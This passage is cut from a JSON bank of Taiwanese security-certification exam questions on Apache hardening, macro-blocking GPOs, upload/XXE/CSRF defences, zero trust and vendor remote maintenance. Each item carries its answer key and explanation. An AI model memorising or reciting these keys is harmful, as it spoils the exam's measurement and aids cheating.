     "source": "112-1 第29題"
    },
    {
     "stem": "在 Linux 系統環境下，關於 Apache安全防護設定，下列敘述何者「不」正確？",
     "options": [
      "檢查是否有非權限用戶對 Apache設定檔擁有存取權限，建議設定成：chmod 644 /usr/local/apache/conf/httpd.conf",
      "檢查是否禁止使用 PUT、DELETE 等危險的HTTP 模式，所以在httpd.conf 中，增加：<LimitExcept GET POST>Allow from all </LimitExcept>",
      "檢查是否禁用 CGI，在 httpd.conf中，刪去有與cgi 相關的 LoadModule語句",
      "禁止非超級使用者修改 Apache伺服器根目錄，執行以下命令變更許可權：chmod -R a-w /usr/local/apache"
     ],
     "answer": 1,
     "hint": "逐行讀懂每個設定指令的實際效果，判斷它是否達成敘述所說的防護目的。",
     "explanation": "答案 B。LimitExcept 的意思是「針對所列方法以外的方法」，若要禁止 PUT、DELETE 等危險方法，應在 <LimitExcept GET POST> 區塊內設定拒絕（Deny from all），B 卻寫成 Allow from all，等於對 GET、POST 以外的方法全部放行，沒有達到禁止的目的，所以 B 不正確。A 檢查設定檔權限，建議設為 chmod 644（擁有者可讀寫、其他人只能讀），官方視為正確。C 不需要 CGI 就移除與 cgi 相關的 LoadModule，減少攻擊面，正確。D 以 chmod -R a-w 移除所有人對 Apache 根目錄的寫入權限，避免非超級使用者修改，正確。",
     "source": "111-1 第6題"
    },
    {
     "stem": "「許多惡意程式會透過郵件附件方式進行入侵破壞與竊取，造成企業重大損失，而資安工程師會透過 Windows 群組原則物件（Group Policy Object, GPO）進行必要管控。」關於附圖登錄檔（Registry）範例內容，下列敘述何者正確？",
     "options": [
      "放行WordPad開啟附件",
      "支援Office 2003 GPO 控制",
      "對Office 2016 MS-Word禁用巨集（Macro）",
      "對Office 2016 MS-Excel 禁用巨集（Macro）"
     ],
     "answer": 2,
     "context": "HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\office\\16.0\\word\\security\ncreate this value:\nDWORD: blockcontentexecutionfrominternet\nValue = 1",
     "hint": "把登錄檔路徑中的版本號、應用程式名稱，以及值名稱所描述的行為，三者逐一對照選項。",
     "explanation": "答案 C。圖中的登錄檔路徑是 HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\office\\16.0\\word\\security，建立 DWORD 值 blockcontentexecutionfrominternet 並設為 1，意思是封鎖來自網際網路的檔案內容執行（含巨集）。路徑中的 16.0 對應 Office 2016，應用程式是 word，所以是對 Office 2016 的 MS-Word 禁用來自網際網路檔案的巨集，C 正確。A 路徑與 WordPad 無關，而且這個設定是在「封鎖」而不是「放行」。B 16.0 是 Office 2016，Office 2003 的版本號是 11.0，不符。D 路徑是 word 而不是 excel，不是 Excel 的設定。",
     "source": "111-1 第7題"
    }
   ]
  },
  {
   "id": "1.2-16",
   "section": "1.2",
   "title": "上傳、XXE 與 CSRF 防護",
   "examHits": 6,
   "examRefs": [
    "114-1 第35題",
    "114-1 第37題",
    "113-2 第11題",
    "111-1 第12題",
    "109-1 第7題",
    "108-1 第7題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "這一組是「Web 應用程式被打了之後怎麼補」。檔案上傳漏洞：副檔名白名單、把檔案存到指定目錄並設為不可執行、對圖片做重新轉檔讓夾帶的程式失效，才是有效的；只在前端網頁擋某種檔名無效，因為攻擊者可以不經過畫面直接送請求；「不限格式、只靠防毒告警」也不是修補。XXE 的成因是 XML 解析器會處理外部實體，所以要停用 DTD／外部實體，與 HTTPS、憑證、雜湊無關。CSRF 靠驗證請求來源（Referer）、伺服器端隨機 token、圖形驗證碼來擋；參數化查詢是防 SQL Injection，不是 CSRF。",
   "keyPoints": [
    "看到「任意檔案上傳漏洞」→ 有效做法是伺服器端的副檔名白名單、上傳目錄不可執行、重新轉檔讓夾帶內容失效；只在前端擋檔名，攻擊者可以繞過。",
    "看到「上傳檔案不限格式，只靠防毒告警」→ 條件放寬又只告警不阻擋，這是最不合適的，修補應該是收緊條件。",
    "看到 XXE → 在解析器端禁止 DTD 引用外部實體；HTTPS、雙向憑證、SHA-3 都不作用在 XML 解析這一層。",
    "看到「登入請求裡有每次都會更新的 csrf 隨機值」→ 這是 CSRF token，用來確認請求來自網站自己的頁面，同時讓暴力破解工具拿舊值送出時失敗。",
    "看到 CSRF 的防禦選項 → Referer 檢查、伺服器端 token、圖形驗證碼可用；Prepared Statement 針對的是 SQL Injection，不適用。"
   ],
   "trap": "把不同攻擊的防禦手段混在一起（例如用參數化查詢去防 CSRF、用 HTTPS 去防 XXE），或把前端檢查當成真正的防線。",
   "quiz": [
    {
     "stem": "情境如附圖所示。承上題，當你調查完畢之後，你判斷這個網頁系統中有一個任意檔案上傳漏洞，因此迅速把弱點資訊回報給資訊部門，並且提供修補建議請他們修補漏洞。請問下列何項建議對於修補這個資安漏洞最「不」適切？",
     "options": [
      "限制上傳檔案的副檔名，並且將檔案移到指定的目錄中",
      "將上傳的圖片進行破壞性的轉檔，讓檔案中潛藏的惡意程式碼失效",
      "透過前端網頁限制使用者不可上傳 GIF 圖片，只要檔名有 .gif 就不讓使用者上傳",
      "將存放網頁應用程式的目錄設定為不可執行檔案"
     ],
     "answer": 2,
     "context": "你是一位企業的藍隊防禦專家，目前你的企業正在進行紅隊演練，今天你忽然收到來自 EDR 的告警，顯示昨天某台伺服器已經被攻擊者取得控制權，於是你開始對這個檔案以及背後的紅隊攻擊行動展開調查。",
     "hint": "回想任意檔案上傳漏洞的防護方式，逐項判斷每個建議能否真正擋住攻擊。",
     "explanation": "答案 C。題目問修補任意檔案上傳漏洞「最不適切」的建議。C 只在前端網頁擋掉 .gif 檔名：前端檢查可以被攻擊者用工具改封包繞過，而且只擋單一檔名而不是以白名單限制，無法真正修補漏洞，所以最不適切。A 限制上傳檔案的副檔名並把檔案移到指定目錄，是伺服器端的有效控管。B 把上傳的圖片做破壞性轉檔，可以讓夾帶在檔案中的惡意程式碼失效，有效。D 把存放網頁應用程式的目錄設為不可執行，即使檔案被上傳也不能被執行，有效。",
     "source": "114-1 第35題"
    },
    {
     "stem": "情境如附圖所示。測試人員在登入畫面發現登入畫面上會針對登入錯誤供了詳細的訊息，如：密碼錯誤，帳號不存在，在嘗試以 Hydra 進行帳密進行暴力破解時，發現都會出現的是登入錯誤的訊息，經過檢查如附圖一所示，此種登入雖然過度的揭露的訊息，它但每次登入時，都會更新附圖一中的值，這種防護方法可以有效的避免那一種攻擊？",
     "options": [
      "SQL 注入（SQL Injection）",
      "跨站請求偽造（Cross Site Request Forgery）",
      "指令注入（Command Injection）",
      "跨站指令碼（Cross Site Scripting）"
     ],
     "answer": 1,
     "context": "某次針對我國人民而言，極為重要的金融網站服務主機的安全測試中，你身為一名安全測試人員，被指派並接受任務，對一個公開運行的網站系統進行詳細檢查。該網站系統為組織自行開發，主要功能包括用戶查詢和管理操作，後端連接了一個關聯式資料庫。這次測試的目的是發現系統可能存在的安全漏洞，並為後續修復提供依據。\n● 初步階段：弱點掃描\n測試開始時，測試人員先利用自動化弱點掃描工具，對整個網站進行全面檢查。掃描範圍涵蓋常見漏洞，包括資料庫安全、權限管理以及前端輸入驗證。工具標記出幾個高風險區域，表明系統的某些功能可能存在問題，例如輸入處理不當和角色驗證的漏洞。這些提示成為後續滲透測試的重點。\n● 滲透測試過程\n測試人員建立了兩個測試用戶，模擬不同權限層級的操作情境：\n高權限用戶：具備管理功能，可以操作敏感資料和設定系統參數。\n低權限用戶：僅限於基本查詢功能，權限受限。\n● 測試步驟\n測試人員根據弱點掃描的線索進行詳細分析，測試的方向集中於兩個方面：\n1. 測試輸入處理功能的安全性，檢查是否能夠通過特殊輸入進一步存取敏感資源。\n2. 測試權限機制，模擬低權限用戶試圖存取高權限功能的情境，檢查系統是否有足夠的防護措施來防止權限提升。\n3. 在測試過程中，測試人員發現某些功能設計中，存在邏輯缺陷，使得低權限用戶可以通過特定操作存取到高權限界面。這些問題進一步證實了弱點掃描的發現。\n\n附圖一\nRequest（Raw）\n1 POST /app/login.php HTTP/1.1\n2 Host: （已遮蔽）\n3 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n5 Accept-Language: en-US,en;q=0.5\n6 Accept-Encoding: gzip, deflate, br\n7 Content-Type: application/x-www-form-urlencoded\n8 Content-Length: 88\n9 Origin: http://（已遮蔽）\n10 Connection: close\n11 Referer: http://（已遮蔽）/app/login.php?f=1\n12 Cookie: PHPSESSID=rmk9hjkmtn8pcr0ol3hq6mu3g6\n13 Upgrade-Insecure-Requests: 1\n14\n15 next=&csrf=2dcaf5c5d7187dcf6b56f10256ee0591d3493a04&username=admin&password=pA%24%24W0RD",
     "hint": "請求裡那個每次都會變的值，伺服器拿它來確認什麼？再回想四種攻擊各自的成因，看哪一種靠它擋。",
     "explanation": "答案 B。附圖一的登入請求中有 csrf=（一長串隨機值）這個欄位，每次登入都會更新，這是 CSRF token：伺服器發出一個不可預測的值，之後只接受帶有這個值的請求，攻擊者從別的網站無法預先得知，所以偽造的請求會失敗；這也是為什麼測試人員用 Hydra 重複送舊值的暴力破解全部回登入錯誤。所以它防的是跨站請求偽造（CSRF），B 正確。A SQL 注入要靠參數化查詢與輸入驗證。C 指令注入要靠輸入驗證與避免把輸入拼進系統指令。D 跨站指令碼（XSS）要靠輸出編碼與輸入過濾。這三種都不是靠每次更新的 token 防的。",
     "source": "114-1 第37題"
    },
    {
     "stem": "如附圖所示，駭客透過某機關網頁上傳功能漏洞植入 APT 惡意程式，並嘗試取得系統資料，恐有資料外洩之虞。下列建議之防範措施何者最「不」合適？",
     "options": [
      "機關建立資通安全威脅偵測管理機制",
      "為落實軟體及資訊完整性防護，上傳檔案不限格式且一律透過防毒軟體告警",
      "對於目錄進行完整性監控及驗證，即時偵測目錄異動行為",
      "辦理服務安全性檢測作業時，可評估採多家廠商交互驗證為宜"
     ],
     "answer": 1,
     "context": "（原題附圖為示意圖，內容：駭客「利用網頁可上傳任意檔案至主機弱點夾帶 APT 程式」，經「網頁上傳功能（示意圖）」（上傳框顯示 Drag and drop or click here，to upload your image (max 2 MiB)）；圖中「APT 攻擊滲透內部系統竊取機敏資料」，指向系統 A、系統 B、系統 C；另有「惡意程式可蒐集機關內資料並有外洩之可能」由上傳點回傳給駭客。）",
     "hint": "逐項判斷：這項防範措施能否降低上傳功能被濫用的風險？",
     "explanation": "答案 B。圖中駭客利用網頁可上傳任意檔案的弱點夾帶 APT 程式，再滲透內部系統竊取資料。B 主張上傳檔案不限格式，而且只透過防毒軟體「告警」：不限格式等於放寬原本應該收緊的上傳條件，只告警不阻擋也無法阻止檔案落地執行，所以最不合適。A 建立資通安全威脅偵測管理機制，可以更早發現異常，合適。C 對目錄做完整性監控與驗證，能即時偵測目錄被異動，合適。D 辦理服務安全性檢測時，評估採多家廠商交互驗證，可以降低單一工具或廠商的盲點，合適。",
     "source": "113-2 第11題"
    },
    {
     "stem": "下列何者對於 XML外部實體注入攻擊（XML External Entity Injection Attack, XXE）的防護效果較佳？",
     "options": [
      "使用HTTPS 安全連線",
      "禁止文件類型定義（Document Type Define, DTD）引用外部實體",
      "使用合法憑證進行雙向（伺服器端與使用者端）之身分驗證",
      "使用SHA-3第三代安全雜湊演算法（Secure Hash Algorithm 3）進行計算"
     ],
     "answer": 1,
     "hint": "回想 XXE 的成因，逐項判斷每項措施是否作用在該成因上。",
     "explanation": "答案 B。XXE 是惡意 XML 文件宣告外部實體，讓解析器去讀取本機檔案或對外發出請求，所以最直接的防護是在解析器端禁止 DTD 引用外部實體（停用 DTD 或外部實體解析）。A HTTPS 保護的是傳輸過程不被竊聽，攻擊者送來的惡意 XML 依然會被解析。C 雙向憑證驗證的是雙方身分，不處理文件內容。D SHA-3 是雜湊演算法，用來做完整性檢查，與 XML 如何被解析無關。",
     "source": "111-1 第12題"
    },
    {
     "stem": "關於跨站請求偽造（Cross-Site Request Forgery, CSRF或XSRF）的防禦方式，下列何者「不」適用？",
     "options": [
      "檢查請求（Request）的來源位址（驗證 HTTP Referer）",
      "在Server Site 產生token，存在Server的session 中",
      "使用圖型驗證碼",
      "Prepared Statement"
     ],
     "answer": 3,
     "hint": "回想 CSRF 的成因與常見防禦，逐項判斷每項措施是否適用於 CSRF。",
     "explanation": "答案 D。題目問「不」適用於防禦 CSRF 的方式。D Prepared Statement（參數化查詢）是把使用者輸入與 SQL 語法分開，防的是 SQL Injection，與請求是不是使用者本意無關，所以不適用。A 檢查 HTTP Referer 驗證請求來源，可以用來擋偽造的跨站請求。B 在伺服器端產生 token 並存在 session，之後比對請求帶來的 token，是標準的 CSRF 防禦。C 使用圖形驗證碼，要求使用者在當下互動，自動送出的偽造請求無法通過。",
     "source": "109-1 第7題"
    }
   ]
  },
  {
   "id": "1.2-17",
   "section": "1.2",
   "title": "零信任與微分段",
   "examHits": 6,
   "examRefs": [
    "115-1 第10題",
    "115-1 第19題",
    "115-1 第27題",
    "114-1 第11題",
    "114-1 第15題",
    "110-1 第8題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "零信任與微分段要解決的是：攻擊者一旦進到內網，就能在主機之間「橫向移動」。傳統做法是在邊界蓋牆，牆內彼此信任；微分段則把防線拉到每個工作負載旁，依身分與狀態動態決定誰能連誰，並且預設拒絕所有跨段流量，所以 VLAN 邏輯切割、只在核心交換器放 ACL、傳統邊界防火牆都不夠細。在工控場域（IEC 62443）裡，分區（Zone）與管道（Conduit）的目的是縮小攻擊者的移動範圍，並讓每個區域有對應的安全等級。零信任不是單一產品，微分段要和身分與存取管理、加密、持續監控搭配運作。信任評等會綜合資產狀態、資源內容與環境因素等。",
   "keyPoints": [
    "看到「最大限度降低橫向移動」→ 選工作負載層、依身分動態決定、預設拒絕的微分段；VLAN、核心交換器 ACL、邊界防火牆的粒度都太粗。",
    "看到「區域（Zone）分割的目的」→ 縮小被入侵後攻擊者橫向移動的範圍、依區域設定安全等級、每個請求都需驗證授權；把所有協同資產放同區並預設互信是反方向。",
    "看到「雲端到本地橫向移動」→ 解法是零信任、網路隔離這類縮小信任範圍的做法；共用同一組管理帳密、只升級防火牆吞吐量都解決不了。",
    "看到「微分段與其他零信任控制的關係」→ 它與身分與存取管理緊密結合，加密與持續監控再提供額外層次，並非獨立運作。",
    "看到「NIST SP 800-207 信任評等」→ 影響結果的是資產狀態、資源內容、環境因素等綜合輸入，單一的密碼長度不是評分輸入類別。"
   ],
   "trap": "把「有切網段」當成「有微分段」：VLAN 只是邏輯切割、邊界防火牆只管南北向，而橫向移動是東西向流量。另外，零信任的重點是「預設不信任、持續驗證」，不是買一台更快的防火牆。",
   "quiz": [
    {
     "stem": "在導入零信任架構的微分段（Micro-segmentation）時，若目標是最大限度降低橫向移動（Lateral Movement）風險，下列何項做法最為有效？",
     "options": [
      "透過虛擬區域網路將子網路進行邏輯切割",
      "在工作負載層實施「基於身分的動態安全群組」並預設拒絕（Default-deny）所有跨段流量",
      "僅於核心交換器設定網路存取控制列表（Access Control List, ACL）",
      "使用傳統邊界防火牆將內、外網物理隔離"
     ],
     "answer": 1,
     "hint": "回想微分段的原理，逐項比較每種做法限制內部主機之間流量的能力。",
     "explanation": "答案 B。微分段要降低橫向移動，關鍵是管制粒度細到工作負載層，規則依身分動態決定而不是依網段位置，並且預設拒絕所有跨段流量，只放行明確授權的連線，B 最有效。A 用 VLAN 做邏輯切割，同一 VLAN 內仍可互通，規則也不隨身分變化，粒度太粗。C 只在核心交換器設定 ACL，管不到工作負載之間的流量，也難以維護細緻規則。D 傳統邊界防火牆做內外網隔離，管的是南北向流量，對已經進入內網的橫向移動無能為力。",
     "source": "115-1 第10題"
    },
    {
     "stem": "情境如附圖所示。W 公司將依據 NIST SP 800-207 的微分割（Micro- Segmentation）方法，將在IEC 62443 的工控場域中重新配置Zone 與Conduit的網路規劃，請問下列何項為分割區域管理的資安目的？",
     "options": [
      "所有協同作業的資產必須規劃在同區域內，預設互相信任確保工控系統最小化調整",
      "降低系統被入侵後，攻擊者在內部網路橫向移動的能力",
      "可針對每個區域設定對應的安全等級（Security Level）",
      "將資源分區管理，每個請求皆需通過即時驗證與授權，限制攻擊範圍"
     ],
     "answer": [
      1,
      2,
      3
     ],
     "context": "W 公司是一家 ODM 公司，製造電子產品供應全球，因應下游客戶的要求，開始強化資訊安全防護與導入國際資安標準的合規認證；經與既有甲設備商確認產線上的 PLC 工控設備不能隨意更動，否則將會影響產線自動化功能與產品生產精確度和良率。\n圖 1（工廠網路示意圖）：Office LAN、MES 主機、AOI 主機與多條產線的 PLC 工控系統（其中一條含 AOI 檢測）皆連接至同一台交換器。\n圖 2　W 公司的工廠主機的弱點偵測掃瞄記錄摘要如下：\n192.168.3.2 (PLC#1)（欄位：Severity／CVSS／Name）\nCRITICAL　10.0　Unsupported Windows OS\nHIGH　7.5　Unsupported Web Server Detection\nHIGH　7.5　Microsoft Windows SMB Shares Unprivileged Access\nMEDIUM　6.8　Security Update for SAM and LSAD Remote Protocols\nMEDIUM　5.1　Microsoft Windows Remote Desktop Protocol Server Man-in-the-Middle Weakness\n192.168.3.3 (PLC#2)\nCRITICAL　10.0　Microsoft Windows SMBv1 Multiple Vulnerabilities\nCRITICAL　10.0　Unsupported Windows OS\nMEDIUM　5.1　Microsoft Windows Remote Desktop Protocol Server Man-in-the-Middle Weakness\nINFO　N/A　Windows Terminal Services Enabled\n192.168.1.102 (MES)\nHIGH　7.5　Unsupported Web Server Detection\nMEDIUM　6.5　Remote Desktop Protocol Server Man-in-the-Middle Weakness\nMEDIUM　6.4　SSL Certificate Cannot Be Trusted\nLOW　2.6　SSL RC4 Cipher Suites Supported (Bar Mitzvah)\n192.168.1.211 (AOI)\nCRITICAL　10.0　Python Unsupported Version Detection\nCRITICAL　10.0　Microsoft SQL Server Unsupported Version Detection (remote check)\nHIGH　7.3　SSL RC4 Cipher Suites Supported (Bar Mitzvah)\nMEDIUM　6.5　SSL Self-Signed Certificate\nMEDIUM　5.0　mDNS Detection (Remote Network)\nLOW　2.6　Terminal Services Encryption Level is not FIPS-140 Compliant\n圖 3（網路分割規劃示意圖）：維護廠商經 VPN 連入；中央為 Conduit 防火牆，分別連接 DMZ（OT DMZ，內有 MES、AOI）、各產線 PL1、PL2、PL3…PLn（每條產線各含 PLC 與生產設備）以及 IT（辦公室，內有電腦與 ERP）。n：代表產線號碼\n圖 4　Conduit Firewall 設定項目：\n甲. Deny All　　乙. Allow All\n丙. Allow IT to DMZ　　丁. Deny PLn to IT\n戊. Allow VPN to PLn　　己. Deny PLn to VPN\n庚. Allow IT to PLn　　辛. Deny PLn to DMZ\n壬. Allow PLm to IT　　癸. Deny PLn to PLm\n子. Allow DMZ to PLm　　丑. Deny DMZ to IT\n寅. Allow VPN to DMZ　　卯. Deny DMZ to VPN\nn 或 m：代表產線號碼",
     "hint": "回想 NIST SP 800-207 與 IEC 62443 Zone／Conduit 的目的，逐項判斷每句是否符合。",
     "explanation": "答案 B、C、D。這是複選題，問分割區域（Zone）管理的資安目的。B 降低系統被入侵後攻擊者在內部網路橫向移動的能力，正確。C 針對每個區域設定對應的安全等級（Security Level），是 IEC 62443 區域管理的做法，正確。D 把資源分區管理，每個請求都需通過即時驗證與授權、限制攻擊範圍，符合 NIST SP 800-207 零信任微分割的精神，正確。A 要求所有協同作業的資產放在同一區域並預設互相信任，與分區、零信任「預設不信任」的目的相反，錯誤。",
     "source": "115-1 第19題"
    },
    {
     "stem": "情境如附圖所示。身為 S公司的資安事件應變小組（CSIRT）負責人，在本次事件中，攻擊者能從雲端橫向移動至本地核心網路，凸顯了現有安全架構的嚴重缺陷。在規劃下一代安全架構時，下列何種策略最「不」能解決此問題？",
     "options": [
      "升級邊界防火牆，購買具備更高吞吐量的設備",
      "實施零信任安全架構（ZTA），廢除傳統信任邊界，對所有存取請求進行嚴格驗證與授權",
      "要求所有雲端與本地系統的管理者使用相同的帳號密碼，以利於管理",
      "建立一個獨立的實體隔離網路（Air-gapped Network），將 IC設計部門與公司其他網路完全隔絕"
     ],
     "answer": 2,
     "context": "位於新竹科學園區的頂尖半導體設計公司「S 公司」，其核心資產為存放於本地資料中心的 IC 設計藍圖。為加速全球供應鏈協作，公司正在導入一套建構於雲端原生（Cloud-Native）環境的供應鏈管理（SCM）平台。該平台的開發流程採用 CI/CD（持續整合/持續部署）模式，並引入了生成式 AI 工具以輔助工程師撰寫程式碼。某日，公司的資安監控中心（SOC）接獲 AI 驅動的「使用者與實體行為分析（UEBA）」系統警報，指出有異常的大量資料從 IC 設計藍圖伺服器被存取，疑似資料外洩。經初步調查，攻擊者是透過 SCM 平台所使用的一個第三方開源函式庫漏洞（供應鏈攻擊）滲透，並利用一個設定不當的網路存取規則，從雲端環境橫向移動至本地資料中心。",
     "hint": "逐項判斷：這個策略對阻止攻擊者從雲端橫向移動到本地網路有沒有幫助？",
     "explanation": "答案 C。題目問規劃下一代安全架構時，最「不」能解決橫向移動問題的策略。C 要求雲端與本地所有管理者使用相同的帳號密碼，這不但解決不了問題，還讓一組憑證外洩就能存取所有系統，違反最小權限與帳號可歸責原則，風險反而更高，所以是官方答案。B 實施零信任架構，廢除傳統信任邊界、嚴格驗證每個存取請求，直接針對橫向移動。D 以實體隔離網路把 IC 設計部門與其他網路完全隔絕，也能阻斷橫向移動。A 升級邊界防火牆、購買更高吞吐量的設備，一般來說只是提升邊界處理量，對已進入內部的橫向移動沒有針對性，官方未說明為何本題不選 A，但 C 是會使情況惡化的反向做法，所以 C 才是最不能解決問題的。",
     "source": "115-1 第27題"
    },
    {
     "stem": "在零信任（Zero Trust）安全架構下，考慮到網路微分割（Network Micro-Segmentation）的實施，下列何項描述最準確地闡述了它與其他零信任安全控制措施（如身份和存取管理、加密和持續監控）的交互作用？",
     "options": [
      "網路微分割獨立於其他零信任控制措施運作，不與身份和存取管理或加密策略互動",
      "身份和存取管理策略在網路微分割實施之前是不必要的，因為微分割本身就足以防範網路入侵",
      "網路微分割與身份和存取管理緊密結合，確保只有驗證和授權的用戶才能存取特定網路段，同時加密和持續監控提供額外的安全層",
      "持續監控在網路微分割實施過程中不起作用，因為微分割旨在隔離和控制網路流量，而不是監控"
     ],
     "answer": 2,
     "hint": "回想零信任架構中各控制措施之間的關係，逐項判斷每句是否成立。",
     "explanation": "答案 C。零信任下的網路微分段不是獨立運作，而是和身分與存取管理緊密結合：只有通過驗證與授權的使用者與裝置才能存取特定網段，再由加密與持續監控提供額外的保護層次。A 說微分段獨立於其他控制措施，錯誤。B 說微分段本身就足以防範入侵、身分與存取管理不必要，忽略了零信任需要多層控制，錯誤。D 說持續監控不起作用，但零信任強調持續驗證與持續監控，監控正是微分段能否有效的重要依據，錯誤。",
     "source": "114-1 第11題"
    },
    {
     "stem": "在使用 NIST SP 800-207 Zero Trust Architecture 架構中的進階身份治理（Enhanced Identity Governance）模式時，請問下列哪些要素會影響最終信任評等的結果計算？",
     "options": [
      "資產狀態（Asset Status）",
      "密碼長度（Password Length）",
      "資源內容（Enterprise Resource）",
      "環境因素（Environmental Factors）"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "hint": "回想 NIST SP 800-207 信任演算法的輸入類別，逐項比對。",
     "explanation": "答案 A、C、D。這是複選題，問 NIST SP 800-207 進階身份治理（Enhanced Identity Governance）模式下，哪些要素會影響信任評等的計算。A 資產狀態（Asset Status）、C 資源內容（Enterprise Resource）、D 環境因素（Environmental Factors）都是信任演算法會採計的輸入。B 密碼長度只是單一憑證的強度設定，不屬於信任評分所採計的輸入類別，所以不選。",
     "source": "114-1 第15題"
    }
   ]
  },
  {
   "id": "1.2-18",
   "section": "1.2",
   "title": "遠端維護與廠商連線管控",
   "examHits": 5,
   "examRefs": [
    "115-2 第13題",
    "113-1 第20題",
    "113-1 第21題",
    "110-1 第19題",
    "108-1 第31題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "廠商需要遠端維護你的系統，或帶自己的設備來連你的網路，風險是：廠商那一端被入侵，攻擊者就拿著合法帳號進來。所以管控要從「誰能連、從哪連、怎麼確認身分、連多久、能碰什麼」下手：防火牆限制來源主機、只有維護人員能走的 VPN、多因子認證，以及最小權限與動態（用時才給）的存取權限；長期固定的維護權限是風險。廠商設備連網前要先確認安全，連線後只要發現符合惡意程式行為，就應立即斷網，不可等工作做完。SSO 是便利與帳密管理機制，不算遠端維護安全的必要條件。",
   "keyPoints": [
    "看到「廠商維護帳號被竊，且 MFA、更新都已做」→ 缺口是長期固定的存取權限，改善是動態權限（用時才授權、最小權限），而不是再加強已經做了的 MFA 或弱掃。",
    "看到「遠端維護必要的管理模式」→ 防火牆限制來源、VPN 限維護人員、多因子認證是必要的；SSO 是便利性，不是必要。",
    "看到「廠商設備連網後出現惡意程式行為」→ 立即斷網，並要求設備先確保安全才能連線；等工作結束再斷是最差的選擇。",
    "看到「無人駐點的新廠需要遠端管理」→ 用 VPN 建立受控的加密連線、用網管系統監控並告警；每台設備都配公開 IP 會擴大暴露面。",
    "看到「改善建議」類題 → 先找出題幹已經做到的和仍存在的缺口，改善要補在缺口上。"
   ],
   "trap": "以為「已經有 MFA 就夠了」而選擇更高的驗證頻率，忽略真正的缺口是帳號權限長期固定；另外，把 SSO 這類便利功能誤當成遠端維護的必要安全措施。",
   "quiz": [
    {
     "stem": "某公司委託第三方廠商維護 ERP 系統，並提供專屬 VPN 帳號供遠端維護使用。近期SOC 發現異常資料存取行為，經調查後確認攻擊者已入侵供應商環境，並利用遭竊之維護帳號成功登入公司內部系統。進一步分析發現如附圖所示，為降低未來類似風險，下列何者最適合作為改善措施？ • VPN 已啟用 MFA • ERP 系統已完成最新安全更新 • 攻擊者僅存取與維護工作相關之資料 • 維護帳號長期擁有固定存取權限",
     "options": [
      "導入動態權限存取機制",
      "增加弱點掃描頻率",
      "提高MFA驗證頻率",
      "要求供應商通過ISO 20000驗證"
     ],
     "answer": 0,
     "hint": "對照題幹列出的現況，逐項問：這項改善措施能否處理此次事件被利用的缺口？",
     "explanation": "答案 A。題幹列出：VPN 已啟用 MFA、ERP 已完成最新更新、攻擊者只存取與維護工作相關的資料、維護帳號長期擁有固定存取權限。缺口是帳號權限長期固定，一旦被竊就能隨時使用，所以應導入動態權限存取機制（需要時才授權、用完即收回，並依最小權限限縮）。B 增加弱點掃描頻率，ERP 已經是最新，且與帳號被竊無關。C 提高 MFA 驗證頻率，MFA 本來就已啟用，攻擊者仍然成功登入，單純增加頻率不處理長期權限的問題。D 要求供應商通過 ISO 20000（IT 服務管理）驗證，是對服務管理的要求，不直接解決存取權限問題。",
     "source": "115-2 第13題"
    },
    {
     "stem": "為提供資通訊系統可以安全進行遠端維護，請問下列何項措施「不」是必要的管理模式？",
     "options": [
      "設定網路火牆管理遠端連線機制及限制存取的主機位置",
      "建立 SSO（Single sign-on）單一簽入作業，統一連線帳密管理",
      "使用多因子認證，確保連線使用者的身份",
      "建立 VPN 機制，僅限制維護作業人員可以進行遠端安全連線作業"
     ],
     "answer": 1,
     "hint": "回想遠端維護的必要管控措施，逐項判斷每項是否屬於必要。",
     "explanation": "答案 B。題目問「不」是必要的管理模式。B 建立 SSO 單一簽入、統一管理連線帳密，主要是使用便利與集中管理，不是讓遠端維護安全的必要條件。A 用防火牆管理遠端連線機制並限制存取的主機位置，是必要的。C 使用多因子認證確保連線者身分，是必要的。D 建立 VPN 機制並只限維護作業人員連線，是必要的。",
     "source": "113-1 第20題"
    },
    {
     "stem": "廠商攜帶設備至機關進行維護作業，機關允許該設備連線至機房網路，待設備接上網路並操作一段時間後，監控中心即發現符合特定惡意程式行為之連線。下列建議之防護措施何者最「不」合適？",
     "options": [
      "機關收到監控中心異常通知後，即時將廠商設備斷網",
      "攜帶之設備或工具應確保安全無虞，方可連線至機關內部網路",
      "廠商應恪守機關資通安全政策及委外廠商管理相關規範要求",
      "須等相關工作結束後，再關閉網路連線"
     ],
     "answer": 3,
     "hint": "逐項判斷：這項措施在題幹情境下是否合適？",
     "explanation": "答案 D。題目問最不合適的防護措施。D 要等工作結束後再關閉網路連線：既然監控中心已經發現符合惡意程式行為的連線，繼續連線只會讓風險擴散，應該立即處置，所以最不合適。A 收到異常通知後即時把廠商設備斷網，是正確的遏制動作。B 攜帶的設備或工具要先確保安全無虞才能連到內部網路，是預防措施。C 廠商要恪守機關資通安全政策與委外廠商管理規範，是基本要求。",
     "source": "113-1 第21題"
    },
    {
     "stem": "公司在協助客戶建置客制化應用軟體系統時，為方便進行遠端維護，下列哪些措施可以增加「系統維護」的安全性？",
     "options": [
      "在公司政策允許下建立 VPN機制，提供作業人員可以進行遠端安全連線",
      "建立單一登入（Single Sign-On, SSO）作業，統一連線帳密管理",
      "設定網路防火牆遠端連線機制及限制存取的主機位置",
      "使用雙因子認證，確保連線使用者"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "hint": "逐項問：這項措施能不能直接提升遠端維護連線的安全性？",
     "explanation": "答案 A、C、D。這是複選題，問哪些措施能增加系統維護的安全性。A 在公司政策允許下建立 VPN，讓作業人員安全地遠端連線，正確。C 設定網路防火牆的遠端連線機制並限制存取的主機位置，正確。D 使用雙因子認證確保連線使用者的身分，正確。B 建立單一登入（SSO）統一管理帳密，一般認為它主要是便利與集中管理，本題官方不列為能增加遠端維護安全性的措施，官方未說明理由。",
     "source": "110-1 第19題"
    },
    {
     "stem": "上述情境中，由於新廠並未規劃設置 MIS 人員，為了達到總廠資訊室人員可以進行設備遠端管理與維護作業，下列哪些維運功能是可考量規劃建置的功能？",
     "options": [
      "新廠資通訊設備必須都設定 Public IP 位置，才能提供端操作管理功能",
      "UTM 設備上必須提供 SSL或 L2TP VPN功能，可以動態建立加密連線即時連接新廠網路處理異常問題",
